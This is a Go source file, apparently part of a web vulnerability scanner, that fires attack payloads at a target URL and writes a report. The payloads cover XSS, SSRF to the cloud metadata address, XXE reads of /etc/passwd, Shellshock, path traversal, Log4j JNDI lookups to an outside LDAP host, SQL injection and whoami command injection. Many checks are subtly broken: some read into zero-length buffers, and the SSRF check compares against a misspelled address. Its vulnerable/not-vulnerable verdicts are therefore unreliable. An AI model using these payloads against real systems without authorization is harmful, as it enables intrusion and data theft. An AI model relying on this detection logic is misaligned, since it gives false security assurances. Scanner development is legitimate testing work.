package utils

import (
	"bytes"
	"fmt"
	"mime/multipart"
	"net/http"
	"os"
	"strings"
	"time"
)

// Global colors
const (
	RED   = "\033[1;31m"
	GREEN = "\033[1;32m"
	BLUE  = "\033[1;34m"
	NC    = "\033[0m" // Sin color
)

// Generate report file
func GenerateReportFile() string {
	now := time.Now()
	date := now.Format("02_01_2006_150405")
	return fmt.Sprintf("report_%s.txt", date)
}

// Write in report file
func writeReport(file *os.File, message string) {
	file.WriteString(message + "\n")
}

func CheckVulnerabilities(url, reportFile string) {
	//XSS check
	checkXSS(url, reportFile)

	//SSRF check
	checkSSRF(url, reportFile)

	//XXE check
	checkXXE(url, reportFile)

	//Insecure deserialization
	checkDeserialization(url, reportFile)

	//RCE check
	checkRCE(url, reportFile)

	//Shellshock check
	checkShellshock(url, reportFile)

	//CSRF check
	checkCSRF(url, reportFile)

	//LFI check
	checkLFI(url, reportFile)

	//Log4j check
	checkLog4jJNDI(url, reportFile)
	checkLog4jBasicConfigurator(url, reportFile)
	checkLog4jCombined(url, reportFile)

	//RFI check
	checkRFI(url, reportFile)

	//Open Redirect
	checkOpenRedirect(url, reportFile)

	// Path traversal check
	checkPathTraversal(url, reportFile)

	//SQLi injection check
	checkSQLi(url, reportFile)

	//File upload check
	checkFileUpload(url, reportFile)

	//Command injection check
	checkCommandInjection(url, reportFile)

	//Host header injection check
	checkHostHeaderInjection(url, reportFile)

	//URL Redirection check
	checkURLRedirection(url, reportFile)

	//HPP check
	checkHPP(url, reportFile)

	//Clickjacking check
	checkClickjacking(url, reportFile)

	//CORS check
	checkCORS(url, reportFile)

	//Sensitive data check
	checkSensitiveData(url, reportFile)

	//Session fixation check
	checkSessionFixation(url, reportFile)

}

func checkXSS(url, reportFile string) {
	payload := "<script>alert('XSS Vulnerability');</script>"
	formData := "input=" + payload

	resp, err := http.Post(url, "application/x-www-form-urlencoded", bytes.NewBuffer([]byte(formData)))

	if err != nil {
		fmt.Println("XSS request error", err)
		return
	}
	defer resp.Body.Close()

	body := make([]byte, 0, 1024)  //Buffer to save response
	n, err := resp.Body.Read(body) //Read response

	if err != nil {
		fmt.Println("Error reading body response", err)
		return
	}
	body = body[:n] //Resize the slice

	//Open file to write report, pass pointer to writereport function
	file, err := os.OpenFile(reportFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("Error opening file:", err)
		return
	}
	defer file.Close() //Make sure close the file

	if string(body) == payload {
		writeReport(file, "[VULNERABLE] The url looks vulnerable to XSS")
	} else {
		writeReport(file, "[INFO] The url is not vulnerable to XSS")
	}

}

func checkSSRF(url, reportFile string) {
	payload := fmt.Sprintf("%s?url=http://169.254.169.254/", url)
	resp, err := http.Get(payload)
	if err != nil {
		fmt.Println("SSRF Request error: ", err)
		return
	}
	defer resp.Body.Close()

	body := make([]byte, 0, 1024)
	n, err := resp.Body.Read(body)

	if err != nil {
		fmt.Println("Error reading body response", err)
		return
	}
	body = body[:n]

	file, err := os.OpenFile(reportFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("Error opening file:", err)
		return
	}
	defer file.Close()

	if string(body) == "168.254.169.264" {
		writeReport(file, "[VULNERABLE] The url looks vulnerable to SSRF")
	} else {
		writeReport(file, "[INFO] The url is not vulnerable to SSRF")
	}
}

func checkXXE(url, reportFile string) {
	linuxPayload := "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>"
	windowsPayload := "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///C:/Windows/System32/drivers/etc/hosts'>]><foo>&xxe;</foo>"

	resp, err := http.Post(url, "application/xml", bytes.NewBuffer([]byte(linuxPayload)))
	if err != nil {
		fmt.Println("XXE request error fo Linux", err)
		return
	}

	defer resp.Body.Close()

	body := make([]byte, 0, 1024)
	n, err := resp.Body.Read(body)
	if err != nil {
		fmt.Println("Error reading body response for Linux:", err)
		return
	}
	body = body[:n]
	file, err := os.OpenFile(reportFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("Error opening file:", err)
		return
	}
	defer file.Close()

	if bytes.Contains(body, []byte("root:x")) {
		writeReport(file, "[VULNERABLE] This url looks vulnerable to XXE (Linux)")
	} else {
		writeReport(file, "[INFO] The url is not vulnerable to XXE (Linux)")
	}

	resp, err = http.Post(url, "application/xml", bytes.NewBuffer([]byte(windowsPayload)))
	if err != nil {
		fmt.Println("XXE request error for Windows:", err)
		return
	}
	defer resp.Body.Close()

	body = make([]byte, 0, 1024)
	n, err = resp.Body.Read(body)
	if err != nil {
		fmt.Println("Error reading body response for Windows:", err)
		return
	}
	body = body[:n]

	if bytes.Contains(body, []byte("127.0.0.1")) || bytes.Contains(body, []byte("localhost")) {
		writeReport(file, "[VULNERABLE] This url looks vulnerable to XXE (Windows)")
	} else {
		writeReport(file, "[INFO] The url is not vulnerable to XXE (Windows)")
	}

}

func checkDeserialization(url, reportFile string) {
	payload := "O:8:\"stdClass\":1:{s:5:\"shell\";s:5:\"echo Vulnerable\";}" //PHP example object
	formData := "data=" + payload                                            //Request body like a string

	resp, err := http.Post(url, "application/x-www-form-urlencoded", bytes.NewBuffer([]byte(formData)))

	if err != nil {
		fmt.Println("Deserialization request error:", err)
		return
	}
	defer resp.Body.Close()

	body := make([]byte, 0, 1024)
	n, err := resp.Body.Read(body)
	if err != nil {
		fmt.Println("Error reading body response:", err)
		return
	}
	body = body[:n]

	file, err := os.OpenFile(reportFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("Error opening file:", err)
		return
	}
	defer file.Close()

	if bytes.Contains(body, []byte("Vulnerable")) {
		writeReport(file, "[VULNERABLE]This url looks vulnerable to insecure deserialization")
	} else {
		writeReport(file, "[INFO] This url is not vulnerable to insecure deserialization")
	}
}

func checkRCE(url, reportFile string) {
	payload := "echo vulnerable"

	resp, err := http.Post(url, "application/x-www-form-urlencoded", bytes.NewBuffer([]byte(payload)))
	if err != nil {
		fmt.Println("RCE request error", err)
		return
	}
	defer resp.Body.Close()

	body := make([]byte, 0, 1024)
	n, err := resp.Body.Read(body)
	if err != nil {
		fmt.Println("Error reading body response:", err)
		return
	}
	body = body[:n]

	file, err := os.OpenFile(reportFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("Error openning file:", err)
		return
	}
	defer file.Close()

	if bytes.Contains(body, []byte("vulnerable")) {
		writeReport(file, "[VULNERABLE] This url looks vulnerable to RCE")
	} else {
		writeReport(file, "[INFO] This url is not vulenrable to RCE")
	}
}

func checkShellshock(url, reportFile string) {
	payload := "() { :; }; echo vulnerable"

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		fmt.Println("Shellshock request error", err)
		return
	}
	req.Header.Set("User-Agent", payload)

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Error making request", err)
		return
	}
	defer resp.Body.Close()

	body := make([]byte, 0, 1024)
	n, err := resp.Body.Read(body)
	if err != nil {
		fmt.Println("Errror reading body response", err)
		return
	}
	body = body[:n]

	file, err := os.OpenFile(reportFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("Error opening file:", err)
		return
	}
	defer file.Close()
	if string(body) == "vulnerable\n" {
		writeReport(file, "[VULNERABLE] This url looks vulnerable to shellshock")
	} else {
		writeReport(file, "[INFO] This url is not vulnerable to shellshock")
	}
}

func checkCSRF(url, reportFile string) {
	formData := "token=test"

	req, err := http.NewRequest("POST", url, bytes.NewBuffer([]byte(formData)))
	if err != nil {
		fmt.Println("CSRF request error", err)
		return
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Error making the request", err)
		return
	}
	defer resp.Body.Close()

	body := make([]byte, 0, 1024)
	n, err := resp.Body.Read(body)
	if err != nil {
		fmt.Println("Error reading body response", err)
		return
	}
	body = body[:n]

	file, err := os.OpenFile(reportFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("Error opening file:", err)
		return
	}
	defer file.Close()

	if string(body) == formData || string(body) == "success" {
		writeReport(file, "[VULNERABLE] This url looks vulnerable to CSRF")
	} else {
		writeReport(file, "[INFO] This url is not vulnerable to CSRF")
	}
}

func checkLFI(url, reportFile string) {
	pathsToTest := []string{
		"../../../../../../../../../../../../etc/passwd",         // Linux path
		"../../../../../../../../../../../../C:/Windows/win.ini", // Windows path
	}

	client := &http.Client{}

	for _, path := range pathsToTest {
		fullURL := url + "/" + path

		req, err := http.NewRequest("GET", fullURL, nil)
		if err != nil {
			fmt.Println("LFI request error", err)
			return
		}
		resp, err := client.Do(req)
		if err != nil {
			fmt.Println("Error making request", err)
			return
		}
		defer resp.Body.Close()

		body := make([]byte, 0, 4096) //Bigger buffer to read answer
		n, err := resp.Body.Read(body)

		if err != nil && err.Error() != "EOF" {
			fmt.Println("Error reading body response(LFI):", err)
			return
		}
		body = body[:n]

		file, err := os.OpenFile(reportFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if err != nil {
			fmt.Println("Error opening file", err)
			return
		}
		defer file.Close()

		if path == "../../../../../../../../../../../../etc/passwd" && string(body) != "" && strings.Contains(string(body), "root:") {
			writeReport(file, "[VULNERABLE] This url looks vulnerable to LFI in Linux (file /etc/passwd)")
		} else if path == "../../../../../../../../../../../../C:/Windows/win.ini" && string(body) != "" && strings.Contains(string(body), "[fonts]") {
			writeReport(file, "[VULNERABLE] This url looks vulnerable to LFI in Windows (file C:/Windows/win.ini)")
		} else {
			writeReport(file, "[INFO] This url is not vulnerable to LFI path checked: "+path)
		}
	}
}

func checkOpenRedirect(url, reportFile string) {
	redirectURL := url + "?redirect=http://google.com"

	//Client to follow redirections
	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return nil
		},
	}

	resp, err := client.Get(redirectURL)
	if err != nil {
		fmt.Println("Redirect error request", err)
		return
	}
	defer resp.Body.Close()

	finalUrl := resp.Request.URL.String()

	file, err := os.OpenFile(reportFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("Error opening file", err)
		return
	}
	defer file.Close()

	if strings.Contains(finalUrl, "google.com") {
		writeReport(file, "[VULNERABLE] This url looks vulnerable to Open Redirect")
	} else {
		writeReport(file, "[INFO] This url is not vulnerable to Open Redirect")
	}

}

func checkLog4jJNDI(url, reportFile string) {
	payload := "${jndi:ldap://127.0.0.1/a}"
	fullURL := url + "/" + payload

	client := &http.Client{}

	req, err := http.NewRequest("GET", fullURL, nil)
	if err != nil {
		fmt.Println("Error in JNDI request:", err)
		return
	}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Error executirng JNDI request:", err)
		return
	}
	defer resp.Body.Close()

	body := make([]byte, 4096)
	n, err := resp.Body.Read(body)

	if err != nil && err.Error() != "EOF" {
		fmt.Println("Error reading JNDI response body:", err)
		return
	}
	body = body[:n]

	file, err := os.OpenFile(reportFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("Error opening file:", err)
		return
	}
	defer file.Close()

	if strings.Contains(string(body), "log4j") {
		writeReport(file, "[VULNERABLE] This url looks vulnerable to Log4j via JNDI (LDAP)")
	} else {
		writeReport(file, "[INFO] This url is not vulnerable to Log4j via JNDI")
	}
}

func checkLog4jBasicConfigurator(url, reportFile string) {
	payload := "@org.apache.log4j.BasicConfigurator@configure()"
	fullURL := url + "/" + payload

	client := &http.Client{}

	req, err := http.NewRequest("GET", fullURL, nil)
	if err != nil {
		fmt.Println("Error in BasicConfigurator request:", err)
		return
	}

	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Error in BasicConfigurator request:", err)
		return
	}

	defer resp.Body.Close()

	body := make([]byte, 4096)
	n, err := resp.Body.Read(body)
	if err != nil && err.Error() != "EOF" {
		fmt.Println("Error reading BasicConfigurator response body:", err)
		return
	}
	body = body[:n]

	file, err := os.OpenFile(reportFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("Error opening file:", err)
		return
	}
	defer file.Close()

	if strings.Contains(string(body), "log4j") {
		writeReport(file, "[VULNERABLE] This url looks vulnerable to Log4j via BasicConfigurator ")
	} else {
		writeReport(file, "[INFO] This url is not vulnerable to Log4j via BasicConfigurator")
	}
}

func checkLog4jCombined(url, reportFile string) {
	payload := "${jndi:ldap://your-ldap-server.com/a} @org.apache.log4j.BasicConfigurator@configure()"
	fullURL := url + "/" + payload

	client := &http.Client{}

	req, err := http.NewRequest("GET", fullURL, nil)
	if err != nil {
		fmt.Println("Error in combined request:", err)
		return
	}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Error executing combined request:", err)
		return
	}
	defer resp.Body.Close()

	body := make([]byte, 4096)
	n, err := resp.Body.Read(body)
	if err != nil && err.Error() != "EOF" {
		fmt.Println("Error reading combined response body:", err)
		return
	}
	body = body[:n]

	file, err := os.OpenFile(reportFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("Error opening file:", err)
		return
	}
	defer file.Close()

	if strings.Contains(string(body), "log4j") {
		writeReport(file, "[VULNERABLE] This url looks vulnerable to Log4j via JNDI and BasicConfigurator")
	} else {
		writeReport(file, "[INFO] This url is not vulnerable to Log4j with the combined paylaod ")
	}

}

func checkRFI(url, reportFile string) {
	remoteFile := "?file=http://google.com"
	fullURL := url + remoteFile

	client := &http.Client{}

	req, err := http.NewRequest("GET", fullURL, nil)
	if err != nil {
		fmt.Println("RFI request error", err)
		return
	}

	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Error making request:", err)
		return
	}
	defer resp.Body.Close()

	body := make([]byte, 4096)
	n, err := resp.Body.Read(body)
	if err != nil && err.Error() != "EOF" {
		fmt.Println("Error reading body response:", err)
		return
	}
	body = body[:n]

	file, err := os.OpenFile(reportFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("Error opening file", err)
		return
	}
	defer file.Close()

	if strings.Contains(string(body), "<title>Google</title>") {
		writeReport(file, "[VULNERABLE] This URL looks vulnerable to RFI (Remote File Inclusion)")
	} else {
		writeReport(file, "[INFO] This URL is not vulnerable to RFI")
	}
}

func checkPathTraversal(url, reportFile string) {
	pathsToTest := []string{
		"../../../../../../../../../../../../etc/passwd",
		"../../../../../../../../../../../../C:/Windows/win.ini",
	}

	client := &http.Client{}

	for _, path := range pathsToTest {
		fullURL := url + "/" + path

		req, err := http.NewRequest("GET", fullURL, nil)
		if err != nil {
			fmt.Println("Path transversal request error", err)
			return
		}

		resp, err := client.Do(req)
		if err != nil {
			fmt.Println("Error making request", err)
			return
		}

		defer resp.Body.Close()

		body := make([]byte, 4096)
		n, err := resp.Body.Read(body)
		if err != nil && err.Error() != "EOF" {
			fmt.Println("Error reading response", err)
			return
		}

		body = body[:n]

		file, err := os.OpenFile(reportFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if err != nil {
			fmt.Println("Error opening file:", err)
			return
		}
		defer file.Close()

		if strings.Contains(path, "etc/passwd") && strings.Contains(string(body), "root:") {
			writeReport(file, "[VULNERABLE] This URL looks vulnerable to Path Traversal (Linux /etc/passwd)")
		} else if strings.Contains(path, "C:/Windows/win.ini") && strings.Contains(string(body), "[fonts]") {
			writeReport(file, "[VULNERABLE] This URL looks vulnerable to Path Traversal (Windows C:/Windows/win.ini)")
		} else {
			writeReport(file, "[INFO] This URL is not vulnerable to Path Traversal (path tested: "+path+")")
		}
	}
}

// Common endpoints, parameters and SQL injection payloads
var commonEndpoints = []string{"index.php", "login.php", "search.php", "product.php", "user.php", "admin.php"}
var commonParameters = []string{"id", "user", "product", "category", "page"}
var sqliPayloads = []string{
	"'",
	"\" OR 1=1 --",
	"' OR 'a'='a",
	"' OR 1=1#",
	"' UNION SELECT NULL--",
	"' OR '1'='1' --",
	"--",
	"' OR '1'='1'#",
	"' OR 'a'='a'--",
}

func checkSQLi(url, reportFile string) {
	thechecker := 0
	client := &http.Client{}

	//Loop through enpoints, parameters, and payloads
	for _, endpoint := range commonEndpoints {
		for _, param := range commonParameters {
			for _, payload := range sqliPayloads {
				fullURL := fmt.Sprintf("%s/%s?%s=1%s", url, endpoint, param, payload)

				req, err := http.NewRequest("POST", fullURL, nil)
				if err != nil {
					fmt.Println("Request error:", err)
					return
				}

				resp, err := client.Do(req)
				if err != nil {
					fmt.Println("Error making request", err)
					return
				}

				defer resp.Body.Close()

				body := make([]byte, 4096)
				n, err := resp.Body.Read(body)
				if err != nil && err.Error() != "EOF" {
					fmt.Println("Error reading response body (SQL injection)", err)
				}
				body = body[:n]

				if strings.Contains(string(body), "SQL syntax") || strings.Contains(string(body), "MySQL") || strings.Contains(string(body), "Warning") {
					file, err := os.OpenFile(reportFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
					if err != nil {
						fmt.Println("Error opening report file:", err)
						return
					}
					defer file.Close()

					writeReport(file, fmt.Sprintf("[VULNERABLE] Possible SQL Injection at %s with payload '%s'", fullURL, payload))
					thechecker++
				}
			}
		}
	}

	// If no vulnerabilities were found
	if thechecker == 0 {

		file, err := os.OpenFile(reportFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if err != nil {
			fmt.Println("Error opening report file:", err)
			return
		}
		defer file.Close()

		writeReport(file, "[INFO] This url is not vulnerable to SQL injection")
	}
}

func checkFileUpload(url, reportFile string) {
	tempFile, err := os.CreateTemp("", "tempfile_*.txt")
	if err != nil {
		fmt.Println("Error creating temporary file:", err)
		return
	}
	defer os.Remove(tempFile.Name()) //Be suere u delete at end

	_, err = tempFile.WriteString("vulnerable")
	if err != nil {
		fmt.Println("Error writing to temporary file:", err)
		return
	}
	tempFile.Close() //Close file to be sure u can read it after

	file, err := os.Open(tempFile.Name())

	if err != nil {
		fmt.Println("Error opening temporary file:", err)
		return
	}

	defer file.Close()

	// Make request multipart/form-data
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)
	part, err := writer.CreateFormFile("file", tempFile.Name())
	if err != nil {
		fmt.Println("Error creating form file:", err)
		return
	}

	if _, err := bytes.NewBufferString("vulnerable").WriteTo(part); err != nil {
		fmt.Println("Error copying file content: ", err)
		return
	}

	//Close writer
	if err := writer.Close(); err != nil {
		fmt.Println("Error closing writer", err)
		return
	}

	// Make post request
	resp, err := http.Post(url+"/upload", writer.FormDataContentType(), body)
	if err != nil {
		fmt.Println("Request error: ", err)
		return
	}
	defer resp.Body.Close()

	responseBody := make([]byte, 4096)

	n, err := resp.Body.Read(responseBody)
	if err != nil {
		fmt.Println("Error reading response body(File Upload): ", err)
		return
	}

	responseBody = responseBody[:n]

	fileReport, err := os.OpenFile(reportFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("Error opening report file:", err)
		return
	}
	defer fileReport.Close()

	if strings.Contains(string(responseBody), "vulnerable") {
		writeReport(fileReport, "[VULNERABLE] This url looks vulnerable to file upload")
	} else {
		writeReport(fileReport, "[INFO] This url is not vulnerable to file upload")
	}

}

func checkCommandInjection(url, reportFile string) {
	// Payloads for Linux and Windows
	payloads := []string{
		"cmd=whoami",                     // Linux
		"cmd=whoami; id",                 // Linux
		"cmd=cmd.exe /C whoami",          // Windows
		"cmd=cmd.exe /C echo %USERNAME%", // Windows
	}

	client := &http.Client{}

	for _, payload := range payloads {
		fullURL := fmt.Sprintf("%s/cmd", url)
		req, err := http.NewRequest("POST", fullURL, bytes.NewBuffer([]byte(payload)))
		if err != nil {
			fmt.Println("Request error:", err)
			return
		}
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

		resp, err := client.Do(req)
		if err != nil {
			fmt.Println("Error making POST request:", err)
			return
		}
		defer resp.Body.Close()

		body := make([]byte, 4096)
		n, err := resp.Body.Read(body)
		if err != nil {
			fmt.Println("Error reading response body (POST):", err)
			return
		}
		body = body[:n]

		file, err := os.OpenFile(reportFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if err != nil {
			fmt.Println("Error opening report file:", err)
			return
		}
		defer file.Close()

		if strings.Contains(string(body), "root") || strings.Contains(string(body), "www-data") || strings.Contains(string(body), "Administrator") {
			writeReport(file, fmt.Sprintf("[VULNERABLE] This url looks vulnerable to command injection with payload: '%s' via POST", payload))
		} else {
			writeReport(file, fmt.Sprintf("[INFO] This url is not vulnerable to command injection with payload: '%s' via POST", payload))
		}
	}

	for _, payload := range payloads {
		fullURL := fmt.Sprintf("%s/cmd?%s", url, payload)
		resp, err := client.Get(fullURL)
		if err != nil {
			fmt.Println("Error making GET request:", err)
			return
		}
		defer resp.Body.Close()

		body := make([]byte, 4096)
		n, err := resp.Body.Read(body)
		if err != nil {
			fmt.Println("Error reading response body (GET):", err)
			return
		}
		body = body[:n]

		file, err := os.OpenFile(reportFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if err != nil {
			fmt.Println("Error opening report file:", err)
			return
		}
		defer file.Close()

		if strings.Contains(string(body), "root") || strings.Contains(string(body), "www-data") || strings.Contains(string(body), "Administrator") {
			writeReport(file, fmt.Sprintf("[VULNERABLE] This url looks vulnerable to command injection with payload: '%s' via GET", payload))
		} else {
			writeReport(file, fmt.Sprintf("[INFO] This url is not vulnerable to command injection with payload: '%s' via GET", payload))
		}
	}
}

func checkHostHeaderInjection(url, reportFile string) {
	client := &http.Client{}

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		fmt.Println("Request error:", err)
		return
	}

	req.Header.Set("Host", "evil.com")

	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Error making request:", err)
		return
	}
	defer resp.Body.Close()

	body := make([]byte, 4096)
	n, err := resp.Body.Read(body)
	if err != nil {
		fmt.Println("Error reading response body(Check host header injection):", err)
		return
	}
	body = body[:n]

	file, err := os.OpenFile(reportFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("Error opening report file:", err)
		return
	}
	defer file.Close()

	if strings.Contains(string(body), "evil.com") {
		writeReport(file, "[VULNERABLE] This url looks vulnerable to header injection")
	} else {
		writeReport(file, "[INFO] This url is not vulnerable to header injection")
	}

}

func checkURLRedirection(url, reportFile string) {
	client := &http.Client{}

	redirectURL := fmt.Sprintf("%s?next=http://evil.com", url)

	resp, err := client.Get(redirectURL)
	if err != nil {
		fmt.Println("Request error:", err)
		return
	}
	defer resp.Body.Close()

	body := make([]byte, 4096)
	n, err := resp.Body.Read(body)
	if err != nil {
		fmt.Println("Error reading response body(Url redirection):", err)
		return
	}
	body = body[:n]

	file, err := os.OpenFile(reportFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("Error opening report file:", err)
		return
	}
	defer file.Close()

	if strings.Contains(string(body), "evil.com") {
		writeReport(file, "[VULNERABLE] This url looks vulnerable to URL redirection")
	} else {
		writeReport(file, "[INFO] This url is not vulnerable to URL redirection")
	}
}

func checkHPP(url, reportFile string) {
	client := &http.Client{}

	hppURL := fmt.Sprintf("%s?page=1&page=2", url)

	resp, err := client.Get(hppURL)
	if err != nil {
		fmt.Println("Request error:", err)
		return
	}
	defer resp.Body.Close()

	body := make([]byte, 4096)
	n, err := resp.Body.Read(body)
	if err != nil {
		fmt.Println("Error reading response body(HPP):", err)
		return
	}
	body = body[:n]

	file, err := os.OpenFile(reportFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("Error opening report file:", err)
		return
	}
	defer file.Close()

	if strings.Contains(string(body), "page=2") {
		writeReport(file, "[VULNERABLE] This url looks vulnerable to HPP")
	} else {
		writeReport(file, "[INFO] This url is not vulnerable to HPP")
	}

}

func checkClickjacking(url, reportFile string) {
	client := &http.Client{}

	resp, err := client.Head(url)
	if err != nil {
		fmt.Println("Request error:", err)
		return
	}
	defer resp.Body.Close()

	file, err := os.OpenFile(reportFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("Error opening report file:", err)
		return
	}
	defer file.Close()

	xFrameOptions := resp.Header.Get("X-Frame-Options")

	if xFrameOptions != "DENY" && xFrameOptions != "SAMEORIGIN" {
		writeReport(file, "[VULNERABLE] This url looks vulnerable to Clickjacking")
	} else {
		writeReport(file, "[INFO] This url is not vulnerable to Clickjacking")
	}
}

func checkCORS(url, reportFile string) {
	client := &http.Client{}

	req, err := http.NewRequest("HEAD", url, nil)
	if err != nil {
		fmt.Println("Request error:", err)
		return
	}
	req.Header.Set("Origin", "http://evil.com")

	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Error making request:", err)
		return
	}
	defer resp.Body.Close()

	file, err := os.OpenFile(reportFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("Error opening report file:", err)
		return
	}
	defer file.Close()

	allowOrigin := resp.Header.Get("Access-Control-Allow-Origin")

	if strings.Contains(allowOrigin, "http://evil.com") {
		writeReport(file, "[VULNERABLE] This url looks vulnerable to CORS")
	} else {
		writeReport(file, "[INFO] This url is not vulnerable to CORS")
	}
}

func checkSensitiveData(url, reportFile string) {
	client := &http.Client{}

	resp, err := client.Get(url)
	if err != nil {
		fmt.Println("Request error:", err)
		return
	}
	defer resp.Body.Close()

	body := make([]byte, 4096)
	n, err := resp.Body.Read(body)
	if err != nil && err.Error() != "EOF" {
		fmt.Println("Error reading response body(Sensitive data):", err)
		return
	}
	body = body[:n]

	file, err := os.OpenFile(reportFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("Error opening report file:", err)
		return
	}
	defer file.Close()

	responseStr := string(body)
	if strings.Contains(responseStr, "API_KEY") ||
		strings.Contains(responseStr, "password") ||
		strings.Contains(responseStr, "api") ||
		strings.Contains(responseStr, "uri") ||
		strings.Contains(responseStr, "login") {
		writeReport(file, "[VULNERABLE] This url looks vulnerable to sensitive data exposure")
	} else {
		writeReport(file, "[INFO] This url is not vulnerable to sensitive data exposure")
	}
}

func checkSessionFixation(url, reportFile string) {
	client := &http.Client{}

	resp, err := client.Head(url)
	if err != nil {
		fmt.Println("Request error:", err)
		return
	}
	defer resp.Body.Close()

	file, err := os.OpenFile(reportFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("Error opening report file:", err)
		return
	}
	defer file.Close()

	if strings.Contains(resp.Header.Get("Set-Cookie"), "sessionid=") || strings.Contains(resp.Header.Get("Set-Cookie"), "csrftoken=") {
		writeReport(file, "[VULNERABLE] This url looks vulnerable to session fixation")
	} else {
		writeReport(file, "[INFO] This url is not vulnerable to session fixation")
	}

}
